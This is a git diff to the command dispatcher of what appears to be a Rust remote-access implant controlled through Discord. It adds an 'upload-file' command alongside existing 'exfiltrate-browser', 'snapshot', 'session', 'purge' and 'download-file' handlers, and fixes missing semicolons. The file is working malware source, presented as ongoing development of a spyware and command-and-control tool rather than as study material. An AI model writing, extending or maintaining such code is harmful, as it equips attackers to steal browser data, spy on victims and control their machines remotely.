@@ -5,6 +5,7 @@ use crate::{
         download::download_handler,
         exit,
         session::{command_handler, session_handler},
+        upload::upload_handler,
     },
     commands::spyware::snapshot::snapshot_handler,
     errors::DiscordC2Error,
@@ -84,28 +85,28 @@ async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandIn
             "purge" => {
                 if let Err(why) = purge_handler(ctx, &command).await {
                     error!("Error handling purge: {:?}", why);
-                    handle_error(ctx, &command, why.to_string()).await
+                    handle_error(ctx, &command, why.to_string()).await;
                 }
                 return;
             }
             "exfiltrate-browser" => {
                 if let Err(why) = handle_exfiltrate(ctx, &command).await {
                     error!("Error handling exfiltrate-browser: {:?}", why);
-                    handle_error(ctx, &command, why.to_string()).await
+                    handle_error(ctx, &command, why.to_string()).await;
                 }
                 return;
             }
             "session" => {
                 if let Err(why) = session_handler(ctx, &command).await {
                     error!("Error handling session: {:?}", why);
-                    handle_error(ctx, &command, why.to_string()).await
+                    handle_error(ctx, &command, why.to_string()).await;
                 }
                 return;
             }
             "snapshot" => {
                 if let Err(why) = snapshot_handler(ctx, &command).await {
                     error!("Error handling snapshot: {:?}", why);
-                    handle_error(ctx, &command, why.to_string()).await
+                    handle_error(ctx, &command, why.to_string()).await;
                 }
                 return;
             }
@@ -121,6 +122,12 @@ async fn handle_command_interaction(ctx: &Context, command: ApplicationCommandIn
             }
             "download-file" => {
                 if let Err(why) = download_handler(ctx, &command).await {
+                    handle_error(ctx, &command, why.to_string()).await;
+                }
+                return;
+            }
+            "upload-file" => {
+                if let Err(why) = upload_handler(ctx, &command).await {
                     handle_error(ctx, &command, why.to_string()).await
                 }
                 return;
